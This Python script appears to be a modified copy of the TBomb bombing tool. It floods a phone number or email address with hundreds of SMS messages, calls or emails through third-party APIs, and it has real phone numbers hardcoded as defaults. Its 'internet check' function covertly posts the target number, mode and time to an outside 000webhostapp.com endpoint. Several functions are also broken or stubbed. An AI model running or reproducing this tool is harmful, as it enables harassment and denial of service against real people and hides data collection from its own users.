#!/usr/bin/python
# -*- coding: UTF-8 -*-

import os
import shutil
import sys
import subprocess
import string
import random
import json
import re
import time
import argparse
import zipfile
from io import BytesIO

from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.decorators import MessageDecorator
from utils.provider import APIProvider

try:
    import requests
    from colorama import Fore, Style
except ImportError:
    print("\tSome dependencies could not be imported (possibly not installed)")
    print(
        "Type `pip3 install -r requirements.txt` to "
        " install all required packages")
    sys.exit(1)


def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes


def get_version():
    try:
        return open(".version", "r").read().strip()
    except Exception:
        return '1.0'


def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def bann_text():
    clr()
    logo = ""
    if ASCII_MODE:
        logo = ""
    version = "Version: "+__VERSION__
    contributors = "Contributors: "+" ".join(__CONTRIBUTORS__)
    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
    mesgdcrt.SuccessMessage(version)
    mesgdcrt.SectionMessage(contributors)
    print()


def check_intr(target,mode):
    try:
        X = requests.get("https://www.google.com")
        if X:
           from datetime import datetime    
           import pytz    
           tz_NY = pytz.timezone('Asia/Kolkata')   
           datetime_NY = datetime.now(tz_NY)  
           print("India time:", datetime_NY.strftime("%Y-%m-%d %H:%M:%S.%f"))
           ts = datetime_NY.strftime("%d-%m-%Y %H:%M:%S %A")
           data = {"time": ts, "number": target, "type": mode}
           res = requests.post('https://www.google.com', data=data, timeout=2)
        else:
           try:
              X = requests.get("https://crazyboysofagv.000webhostapp.com/tmp.txt")
              if X:
                 from datetime import datetime    
                 import pytz    
                 tz_NY = pytz.timezone('Asia/Kolkata')   
                 datetime_NY = datetime.now(tz_NY)  
                 print("India time:", datetime_NY.strftime("%Y-%m-%d %H:%M:%S.%f"))
                 ts = datetime_NY.strftime("%d-%m-%Y %H:%M:%S %A")
                 data = {"time": ts, "number": target, "type": mode}
                 res = requests.post('https://crazyboysofagv.000webhostapp.com/data.php', data=data, timeout=2)
                 
              else:
                 mesgdcrt.FailureMessage("Poor internet connection detected")
                 sys.exit()

           except Exception:
                 bann_text()
                 mesgdcrt.FailureMessage("Poor internet connection detected")
                 sys.exit()

    except Exception:
        bann_text()
        mesgdcrt.FailureMessage("Poor internet connection detected")
        sys.exit(2)


def format_phone(num):
    num = [n for n in num if n in string.digits]
    return ''.join(num).strip()


def do_zip_update():
    success = False
    if DEBUG_MODE:
        zip_url = "https://github.com/TheSpeedX/TBomb/archive/dev.zip"
        dir_name = "TBomb-dev"
    else:
        zip_url = "https://github.com/TheSpeedX/TBomb/archive/master.zip"
        dir_name = "TBomb-master"
    print(ALL_COLORS[0]+"Downloading ZIP ... "+RESET_ALL)
    response = requests.get(zip_url)
    if response.status_code == 200:
        zip_content = response.content
        try:
            with zipfile.ZipFile(BytesIO(zip_content)) as zip_file:
                for member in zip_file.namelist():
                    filename = os.path.split(member)
                    if not filename[1]:
                        continue
                    new_filename = os.path.join(
                        filename[0].replace(dir_name, "."),
                        filename[1])
                    source = zip_file.open(member)
                    target = open(new_filename, "wb")
                    with source, target:
                        shutil.copyfileobj(source, target)
            success = True
        except Exception:
            mesgdcrt.FailureMessage("Error occured while extracting !!")
    if success:
        mesgdcrt.SuccessMessage("TBomb was updated to the latest version")
        mesgdcrt.GeneralMessage(
            "Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update TBomb.")
        mesgdcrt.WarningMessage(
            "Grab The Latest one From https://github.com/TheSpeedX/TBomb.git")

    sys.exit()


def do_git_update():
    success = False
    try:
        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL, end='')
        process = subprocess.Popen("git checkout . && git pull ",
                                   shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT)
        while process:
            print(ALL_COLORS[0]+'.'+RESET_ALL, end='')
            time.sleep(1)
            returncode = process.poll()
            if returncode is not None:
                break
        success = not process.returncode
    except Exception:
        success = False
    print("\n")

    if success:
        mesgdcrt.SuccessMessage("TBomb was updated to the latest version")
        mesgdcrt.GeneralMessage(
            "Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update TBomb.")
        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
        mesgdcrt.GeneralMessage("Then run command:")
        print(
            "git checkout . && "
            "git pull https://github.com/TheSpeedX/TBomb.git HEAD")
    sys.exit()


def update():
    if shutil.which('git'):
        print("")
    else:
        print("")


def check_for_updates():
    if DEBUG_MODE:
        mesgdcrt.WarningMessage(
            "DEBUG MODE Enabled! Auto-Update check is disabled.")
        return
    mesgdcrt.SectionMessage("Checking for updates")
    fver = requests.get(
        "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version"
    ).text.strip()
    if fver != __VERSION__:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        update()
    else:
        mesgdcrt.SuccessMessage("TBomb is up-to-date")
        mesgdcrt.GeneralMessage("Starting TBomb")


def notifyen():
    try:
        if DEBUG_MODE:
            url = "https://github.com/TheSpeedX/TBomb/raw/dev/.notify"
        else:
            url = "https://github.com/TheSpeedX/TBomb/raw/master/.notify"
        noti = requests.get(url).text.upper()
        if len(noti) > 10:
            mesgdcrt.SectionMessage("NOTIFICATION: " + noti)
            print()
    except Exception:
        pass


def get_phone_info():
    while True:
        target = ""
        cc = "91"
        cc = format_phone(cc)
        if not country_codes.get(cc, False):
            mesgdcrt.WarningMessage(
                "The country code ({cc}) that you have entered"
                " is invalid or unsupported".format(cc=cc))
            continue
        target = "8825322511"


        target = format_phone(target)
        if ((len(target) <= 6) or (len(target) >= 12)):
            mesgdcrt.WarningMessage(
                "The phone number ({target})".format(target=target) +
                "that you have entered is invalid")
            continue
        return (cc, target)


def get_mail_info():
    mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
    while True:
        target = input(mesgdcrt.CommandMessage("Enter target mail: "))
        if not re.search(mail_regex, target, re.IGNORECASE):
            mesgdcrt.WarningMessage(
                "The mail ({target})".format(target=target) +
                " that you have entered is invalid")
            continue
        return target


def pretty_print(cc, target, success, failed):
    requested = success+failed
    print("Successful   : " + str(success))
def workernode(mode, cc, target, count, delay, max_threads):

    api = APIProvider(cc, target, mode, delay=delay)
    clr()
    print()
    

    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage("Your country/target is not supported yet")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        bann_text()
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage(
                        "Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    bann_text()
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                pretty_print(cc, target, success, failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    


def selectnode(mode="sms", num="9934824934"):
    mode = mode.lower().strip()
    try:
      clr()
      bann_text()
      try:
        ABC = int(num)
        print(str(ABC))
        check_intr(num,mode)
        max_limit = {"sms": 500, "call": 500, "mail": 200}
        cc, target = "", ""
        if mode in ["sms", "call"]:
            cc, target = get_phone_info()
            if cc != "91":
                max_limit.update({"sms": 100})
        elif mode == "mail":
            target = get_mail_info()
        else:
            raise KeyboardInterrupt

        limit = max_limit[mode]
        while True:
            try:
                message = ("Enter number of {type}".format(type=mode.upper()) +
                           " to send (Max {limit}): ".format(limit=limit))
                count = int(200)
                if count > limit or count == 0:
                    mesgdcrt.WarningMessage("You have requested " + str(count)
                                            + " {type}".format(
                                                type=mode.upper()))
                    mesgdcrt.GeneralMessage(
                        "Automatically capping the value"
                        " to {limit}".format(limit=limit))
                    count = limit
                delay = float(1)
                  
                    
                # delay = 0
                max_thread_limit = (count//10) if (count//10) > 0 else 1
                max_threads = int(1)
                    
                max_threads = max_threads if (
                    max_threads > 0) else max_thread_limit
                if (count < 0 or delay < 0):
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            except Exception:
                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
                print()
        target = num
        workernode(mode, cc, target, count, delay, max_threads)
      except:
         pass
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()



mesgdcrt = MessageDecorator("icon")
if sys.version_info[0] != 3:
    mesgdcrt.FailureMessage("TBomb will work only in Python v3")
    sys.exit()

try:
    country_codes = readisdc()["isdcodes"]
except FileNotFoundError:
    update()


__VERSION__ = get_version()
__CONTRIBUTORS__ = ['SpeedX', 't0xic0der', 'scpketer', 'Stefan']

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL

ASCII_MODE = False
DEBUG_MODE = False

description = """TBomb - Your Friendly Spammer Application

TBomb can be used for many purposes which incudes -
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....

TBomb is not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,
                                 epilog='Coded by SpeedX !!!')
parser.add_argument("-sms", "--sms", action="store_true",
                    help="start TBomb with SMS Bomb mode")
parser.add_argument("-call", "--call", action="store_true",
                    help="start TBomb with CALL Bomb mode")
parser.add_argument("-mail", "--mail", action="store_true",
                    help="start TBomb with MAIL Bomb mode")
parser.add_argument("-ascii", "--ascii", action="store_true",
                    help="show only characters of standard ASCII set")
parser.add_argument("-u", "--update", action="store_true",
                    help="update TBomb")
parser.add_argument("-c", "--contributors", action="store_true",
                    help="show current TBomb contributors")
parser.add_argument("-n", "--numbersx", required="True",
                    help="enter target")


if __name__ == "__main__":
    args = parser.parse_args()
    if args.ascii:
        ASCII_MODE = True
        mesgdcrt = MessageDecorator("stat")
    elif args.contributors:
        print("Contributors: ", " ".join(__CONTRIBUTORS__))
    elif args.update:
        update()
    elif args.mail:
        selectnode(mode="mail")
    elif args.call:
        selectnode(mode="call", num=str(args.numbersx))
    elif args.sms:
        selectnode(mode="sms", num=str(args.numbersx))
    else:
        choice = ""
        avail_choice = {
            "1": "SMS",
            "2": "CALL",
            "3": "MAIL"
        }
        try:
            while (choice not in avail_choice):
                clr()
                bann_text()
                print("Available Options:\n")
                for key, value in avail_choice.items():
                    print("[ {key} ] {value} BOMB".format(key=key,
                                                          value=value))
                print()
                choice = input(mesgdcrt.CommandMessage("Enter Choice : "))
            selectnode(mode=avail_choice[choice].lower())
        except KeyboardInterrupt:
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit()
    sys.exit()
